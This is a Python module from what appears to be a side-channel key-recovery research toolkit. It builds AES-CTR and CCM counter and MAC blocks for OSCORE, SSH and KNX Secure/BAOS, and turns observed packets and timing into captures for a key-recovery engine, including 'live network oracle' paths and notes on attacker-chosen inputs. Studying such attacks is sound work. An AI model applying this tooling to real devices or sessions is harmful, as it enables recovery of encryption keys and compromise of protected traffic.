"""OSCORE, SSH and KNX Secure as flash-timing oracles.

The first two encrypt with an **AES-CTR keystream** under a key that is *fixed
across a huge number of blocks* (see EXPOSURE.md / the network catalogue):

  * **OSCORE** (CoAP, RFC 8613) uses COSE **AES-CCM-16-64-128** by default. CCM is
    CBC-MAC + CTR; the CTR keystream blocks are ``S_i = E(k, A_i)`` where the
    counter block ``A_i`` is built from the *public* OSCORE nonce (Partial IV +
    Sender ID). The AEAD key is derived once from the static master secret and
    **does not rotate as the Partial IV climbs** - one key for the life of the
    security context.
  * **SSH** (RFC 4344 ``aes*-ctr``; RFC 5647 ``aes*-gcm``) encrypts every binary
    packet with an AES-CTR keystream ``E(k, ctr)`` under a data key that is fixed
    until rekey (OpenSSH default 1-4 GiB = 6.7e7-2.7e8 blocks).

**The cryptanalytic reduction:** in both, the block-cipher *output* the last-round
attack needs is exactly the keystream block, which a known-plaintext attacker
recovers as ``keystream = P ^ C``. That is the engine's existing ``ctr`` mode --
so the recovery code is unchanged and these modules only (a) build the correct
counter blocks (for the simulator and firmware, and to document realism), and
(b) turn observed packets into a ``Capture``. See ``sources.SimulatedProtocolSource``
for the hardware-free demo and ``sources.{Oscore,Ssh}NetworkSource`` for the live
network oracle.
"""
from __future__ import annotations
import numpy as np
from . import aesref
from .capture import Capture


# --------------------------------------------------------------------------
# Counter-block construction (needed by the simulator/firmware to produce the
# right E(k, .) inputs; the host attack keys off keystream = P^C and never needs
# these, which is the point - no chosen input required).
# --------------------------------------------------------------------------

def ccm_counter_blocks(nonce: bytes, n_blocks: int, *, L: int = 2, start: int = 1):
    """AES-CCM CTR counter blocks A_i (RFC 3610 s2.3), i = start..start+n-1.

    A_i = Flags(1) || Nonce(15-L) || i (L bytes, big-endian),  Flags = L-1.
    OSCORE's default AES-CCM-16-64-128 has L=2 -> 13-byte nonce, Flags=0x01.
    A_0 encrypts the tag; message blocks use A_1, A_2, ...  (`start=1`).
    """
    nlen = 15 - L
    if len(nonce) != nlen:
        raise ValueError(f"CCM L={L} needs a {nlen}-byte nonce, got {len(nonce)}")
    flags = L - 1
    A = np.zeros((n_blocks, 16), np.uint8)
    A[:, 0] = flags
    A[:, 1:1 + nlen] = np.frombuffer(nonce, np.uint8)[None, :]
    ctr = (np.arange(n_blocks, dtype=np.uint64) + start)
    for b in range(L):
        A[:, 15 - b] = (ctr >> (8 * b)) & 0xFF
    return A


def oscore_nonce(piv: bytes, sender_id: bytes, common_iv: bytes, *, nonce_len: int = 13):
    """OSCORE AEAD nonce (RFC 8613 s5.2): left-pad Partial IV and Sender ID into
    the nonce frame, then XOR the Common IV. All inputs are public (they travel in
    the OSCORE option / are fixed per context), so the attacker can reconstruct
    every counter block without any secret."""
    S = nonce_len - 6
    frame = bytearray(nonce_len)
    frame[0] = len(piv) & 0x07                     # leftmost byte = |PIV|
    frame[1 + (S - len(sender_id)):1 + S] = sender_id
    frame[nonce_len - len(piv):] = piv
    civ = np.frombuffer(common_iv, np.uint8)
    return bytes(np.frombuffer(bytes(frame), np.uint8) ^ civ)


def ssh_ctr_blocks(iv: bytes, n_blocks: int, *, start: int = 0):
    """SSH AES-CTR counter blocks (RFC 4344): a 128-bit big-endian counter seeded
    from the KEX-derived IV and incremented by one per cipher block."""
    if len(iv) != 16:
        raise ValueError("SSH CTR IV is one 16-byte block")
    base = int.from_bytes(iv, "big")
    B = np.zeros((n_blocks, 16), np.uint8)
    for r in range(n_blocks):
        v = (base + start + r) & ((1 << 128) - 1)
        B[r] = np.frombuffer(v.to_bytes(16, "big"), np.uint8)
    return B


# --------------------------------------------------------------------------
# Observed-packet -> Capture  (the live oracle path; no key used).
# --------------------------------------------------------------------------

def keystream_from_observed(plaintext, ciphertext):
    """keystream = P ^ C, the block-cipher output for any CTR-family AEAD
    (OSCORE AES-CCM, SSH AES-CTR/GCM). Known-plaintext only; no key."""
    p = np.asarray(plaintext, np.uint8).reshape(-1, 16)
    c = np.asarray(ciphertext, np.uint8).reshape(-1, 16)
    return p ^ c


def capture_from_observed(plaintext, ciphertext, timing, *, label=""):
    """Build the Capture the engine runs on, from OBSERVED packet bytes and a
    per-block timing. Mode is 'ctr' (keystream = P^C -> recovers k10 -> master)."""
    p = np.asarray(plaintext, np.uint8).reshape(-1, 16)
    c = np.asarray(ciphertext, np.uint8).reshape(-1, 16)
    t = np.asarray(timing, float)
    if not (len(p) == len(c) == len(t)):
        raise ValueError("plaintext, ciphertext and timing must have equal length")
    return Capture(timing=t, mode="ctr", keysize=128, plaintext=p, ciphertext=c,
                   line_shift_last=4, label=label or "protocol")


# --------------------------------------------------------------------------
# Wire-format codecs shared by the CLI, the local test server, and the F429
# firmware (demo/oscore/fw). Request: 0xC0, K, PartialIV[4] big-endian.
# Reply: ct[16] (protected message block) then cyc[4] little-endian (device
# calibration count; a real attacker uses its own PTP/2nd-MCU timestamp).
# --------------------------------------------------------------------------

OSCORE_KNOWN_PT = b"CoAP/2.05 Conten"          # 16 bytes; matches fw_f4_oscore
OSCORE_NONCE_BASE = bytes([0,1,2,3,4,5,6,7,8,9,10,0,0])   # 13-byte CCM nonce base


def oscore_request(i: int, K: int = 1) -> bytes:
    return bytes([0xC0, K & 0xFF]) + (i & 0xFFFFFFFF).to_bytes(4, "big")


def oscore_nonce_for_piv(piv: int, base: bytes = OSCORE_NONCE_BASE) -> bytes:
    """Mirror the firmware: 13-byte nonce = base[0:9] || PartialIV (4 bytes BE)."""
    return bytes(base[:9]) + (piv & 0xFFFFFFFF).to_bytes(4, "big")


def oscore_decode(resp: bytes, known_pt: bytes = OSCORE_KNOWN_PT):
    """(pt16, ct16) for the protected message block; keystream = pt ^ ct."""
    return (np.frombuffer(known_pt, np.uint8), np.frombuffer(resp[:16], np.uint8))


def oscore_cycles(resp: bytes) -> int:
    """Device calibration count from reply bytes 16..19 (little-endian)."""
    b = resp[16:20]
    return int(b[0] | (b[1] << 8) | (b[2] << 16) | (b[3] << 24)) if len(b) == 4 else 0


# ==========================================================================
# KNX Secure - three CCM dialects, and only SOME of their AES inputs are
# attacker-known. This section is the block math only; the frames, the live
# probes and the oracles are in demo/knx_secure/.
#
# All three are CCM = CBC-MAC + CTR, so every operation is a raw AES-128
# ENCRYPT, which is the reduction this attack likes. What differs from OSCORE
# is WHICH of the blocks an attacker can write down without the key:
#
#   * CTR blocks (`*_ctr_blocks`) are built from public, usually chosen fields
#     - fully known. With known plaintext the keystream gives the matching AES
#     *output* too, so this is the `ctr` mode the engine already has.
#   * The FIRST CBC block B0 (`*_b0`) is MAC input number one and is not
#     chained, so it is also fully known - and in two of the three dialects it
#     is wholly attacker-chosen. First-round ladder material, with no output.
#   * Every LATER CBC block is `Y(i-1) ^ data`, and Y(i-1) is a key-dependent
#     unknown. Known data does NOT make those inputs known. A ladder run on
#     them recovers differences of `Y1 ^ K0`, not of `K0`
#     (research/exposure/KNX_SECURE.md s3.2) - which is why
#     `knxip_mac_data_blocks` returns DATA blocks and is explicit that they are
#     not AES inputs.
#
# Layouts below are verified against the KNX specification's own example frames
# (via XKNX/xknx examples/ip_secure_calculations.py) and, for BAOS, against
# Appendices E and F of the Weinzierl BAOS binary protocol v2.2 specification;
# demo/knx_secure/test_knxsec.py and test_baos.py hold those vectors.
# ==========================================================================

#: KNXnet/IP service type identifiers this project touches.
KNXIP_SECURE_WRAPPER = 0x0950
KNXIP_SESSION_REQUEST = 0x0951
KNXIP_SESSION_RESPONSE = 0x0952
KNXIP_SESSION_AUTHENTICATE = 0x0953
KNXIP_SESSION_STATUS = 0x0954
KNXIP_TIMER_NOTIFY = 0x0955

#: BAOS ObjectServer secure frame main service codes (Weinzierl v2.2 s4.2.1).
BAOS_SECURE_WRAPPER = 0xC0
BAOS_SECURE_FAILURE = 0xC1
BAOS_SECURE_SYNC_REQ = 0xC2
BAOS_SECURE_SYNC_RES = 0xC3
#: The two constants that distinguish a BAOS MAC block from a BAOS CTR block,
#: and the wrapper service from the sync service. Byte 15 of B0/Ctr0.
BAOS_FLAG_MAC = 0x08
BAOS_FLAG_CTR = 0x09
BAOS_FLAG_SYNC_MAC = 0x12
BAOS_FLAG_SYNC_CTR = 0x13


def _seq6(seq):
    """(n, 6) uint8 big-endian from an int, bytes, or array of either."""
    if isinstance(seq, (bytes, bytearray)):
        if len(seq) != 6:
            raise ValueError("a KNX sequence number is 6 octets")
        return np.frombuffer(bytes(seq), np.uint8)[None, :]
    a = np.atleast_1d(np.asarray(seq, np.uint64))
    out = np.zeros((len(a), 6), np.uint8)
    for b in range(6):
        out[:, 5 - b] = (a >> np.uint64(8 * b)) & np.uint64(0xFF)
    return out


# ---------------------------------------------------------------- KNXnet/IP --

def knxip_b0(seq, serial, tag, payload_len):
    """SecureWrapper MAC block B0 = seq(6) || serial(6) || tag(2) || len(2).

    Fully attacker-known, and on the SECURE ROUTING path (one fixed backbone
    key, no session state) fully attacker-CHOSEN: all sixteen octets come off
    the wire the attacker wrote. `payload_len` is the length of the plain
    encapsulated frame, not of the wrapper.
    """
    s = _seq6(seq)
    n = len(s)
    B = np.zeros((n, 16), np.uint8)
    B[:, 0:6] = s
    B[:, 6:12] = np.frombuffer(bytes(serial), np.uint8)[None, :]
    B[:, 12:14] = np.frombuffer(bytes(tag), np.uint8)[None, :]
    pl = np.atleast_1d(np.asarray(payload_len, np.uint32))
    B[:, 14] = (pl >> 8) & 0xFF
    B[:, 15] = pl & 0xFF
    return B


def knxip_ctr_blocks(seq, serial, tag, n_blocks, *, start=0):
    """SecureWrapper CTR blocks: seq(6) || serial(6) || tag(2) || 0xFF || j.

    `j = 0` encrypts the MAC; `j >= 1` encrypts the frame. Returns
    (n_seq, n_blocks, 16) so a whole capture's counter blocks come out in one
    call, in the layout `engine` wants after a reshape.
    """
    s = _seq6(seq)
    n = len(s)
    B = np.zeros((n, n_blocks, 16), np.uint8)
    B[:, :, 0:6] = s[:, None, :]
    B[:, :, 6:12] = np.frombuffer(bytes(serial), np.uint8)[None, None, :]
    B[:, :, 12:14] = np.frombuffer(bytes(tag), np.uint8)[None, None, :]
    B[:, :, 14] = 0xFF
    B[:, :, 15] = (np.arange(n_blocks, dtype=np.uint16) + start) & 0xFF
    return B


def knxip_mac_data_blocks(a_data: bytes, payload: bytes = b"") -> np.ndarray:
    """The CBC-MAC *data* blocks after B0: len(A) (2, BE) || A || P, zero-padded.

    NOT AES inputs. The AES input to block i is `Y(i-1) ^ these[i]`, and Y is
    key-dependent; see this section's header. Returned so a model can say which
    bytes of the chain an attacker moves, which is what a difference ladder on
    block 1 of the chain needs.
    """
    blocks = len(a_data).to_bytes(2, "big") + a_data + payload
    if len(blocks) % 16:
        blocks += bytes(16 - len(blocks) % 16)
    return np.frombuffer(blocks, np.uint8).reshape(-1, 16)


def knxip_session_response_a_data(session_id: int, pub_xor: bytes) -> bytes:
    """A-data of the SESSION_RESPONSE MAC: header(6) || session id(2) || XOR(32).

    The one unauthenticated fixed-key oracle in KNX IP Secure: `SESSION_REQUEST`
    needs no credential and the reply MACs this under the long-lived device
    authentication code. B0 is sixteen zero octets there, so the chain's first
    AES input is a CONSTANT and everything after it is chained - read
    research/exposure/KNX_SECURE.md s3.2 before planning a ladder on it.
    """
    if len(pub_xor) != 32:
        raise ValueError("the XOR of two X25519 public values is 32 octets")
    total = 6 + 2 + 32 + 16
    hdr = bytes([0x06, 0x10]) + KNXIP_SESSION_RESPONSE.to_bytes(2, "big") \
        + total.to_bytes(2, "big")
    return hdr + int(session_id).to_bytes(2, "big") + pub_xor


# ---------------------------------------------------------------- BAOS/8830 --

def baos_b0(seq, payload_len):
    """BAOS secure wrapper MAC block B0 = seq(6) || 0*8 || 0x08 || L.

    Attacker-chosen in full: the sequence counter is the one the client picks
    (the server only checks it is greater than the last accepted one, and that
    check is disabled outright when the receive counter is set to all-ones).
    Verified against Appendix E of the BAOS v2.2 specification.
    """
    s = _seq6(seq)
    n = len(s)
    B = np.zeros((n, 16), np.uint8)
    B[:, 0:6] = s
    B[:, 14] = BAOS_FLAG_MAC
    B[:, 15] = np.atleast_1d(np.asarray(payload_len, np.uint8))
    return B


def baos_ctr_blocks(seq, n_blocks, *, start=0):
    """BAOS secure wrapper CTR blocks: seq(6) || 0*8 || 0x09 || j.

    `j = 0` encrypts the MAC, `j >= 1` the ObjectServer service. Note what is
    NOT here: no serial number and no message tag, so a BAOS counter block is
    six chosen octets and ten constants - the narrowest chosen-input surface
    of the three dialects, and the only one with no per-device salt in it.
    """
    s = _seq6(seq)
    n = len(s)
    B = np.zeros((n, n_blocks, 16), np.uint8)
    B[:, :, 0:6] = s[:, None, :]
    B[:, :, 14] = BAOS_FLAG_CTR
    B[:, :, 15] = (np.arange(n_blocks, dtype=np.uint16) + start) & 0xFF
    return B


def baos_sync_b0(seq, challenge, *, payload_len=6, challenge_at=6):
    """B0 of the BAOS secure Sync REQUEST: seq(6) || challenge(6) || 0,0,0x12,L.

    **`challenge_at` is the one inferred byte offset in this file.** The v2.2
    specification's block diagram (s4.2.2.3) lays the challenge out in a table
    whose column headers do not survive text extraction; 6 is the only offset
    consistent with the response's B0 (s4.2.2.4), which is
    `random(6) || 0*8 || 0x12 || 12`. Resolve it against a device before
    quoting a result from it - demo/knx_secure/README.md says how, and the
    answer is a yes/no from one frame, because a wrong B0 gets no response at
    all rather than a wrong one.
    """
    s = _seq6(seq)
    n = len(s)
    B = np.zeros((n, 16), np.uint8)
    B[:, 0:6] = s
    B[:, challenge_at:challenge_at + 6] = np.frombuffer(bytes(challenge), np.uint8)[None, :]
    B[:, 14] = BAOS_FLAG_SYNC_MAC
    B[:, 15] = payload_len
    return B


def baos_sync_ctr0(seq):
    """Ctr0 of the BAOS secure Sync request: seq(6) || 0*8 || 0x13 || 0."""
    s = _seq6(seq)
    n = len(s)
    B = np.zeros((n, 16), np.uint8)
    B[:, 0:6] = s
    B[:, 14] = BAOS_FLAG_SYNC_CTR
    return B
